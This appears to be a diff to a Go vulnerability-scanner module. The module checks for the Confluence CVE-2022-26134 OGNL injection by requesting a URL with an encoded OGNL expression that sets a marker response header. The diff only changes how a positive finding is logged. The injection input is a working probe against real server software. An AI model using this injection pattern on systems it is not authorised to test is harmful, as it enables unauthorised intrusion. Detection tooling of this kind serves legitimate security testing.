@@ -1,7 +1,6 @@
 package confluence
 
 import (
-	"fmt"
 	"github.com/hktalent/scan4all/lib/util"
 )
 
@@ -11,7 +10,7 @@ import (
 func CVE_2022_26134(u string) bool {
 	if req, err := util.HttpRequset(u+"/%24%7B@com.opensymphony.webwork.ServletActionContext@getResponse%28%29.setHeader%28%22X-V-Response%22%2C%22vvv%22%29%7D/", "GET", "", false, nil); err == nil {
 		if (*req.Header)["X-V-Response"] != nil {
-			util.GoPocLog(fmt.Sprintf("Found Confluence CVE_2022_26134|--\"%s\"\n", u))
+			util.SendLog(req.RequestUrl, "CVE-2022-26134", "Found Confluence ", "")
 			return true
 		}
 	}
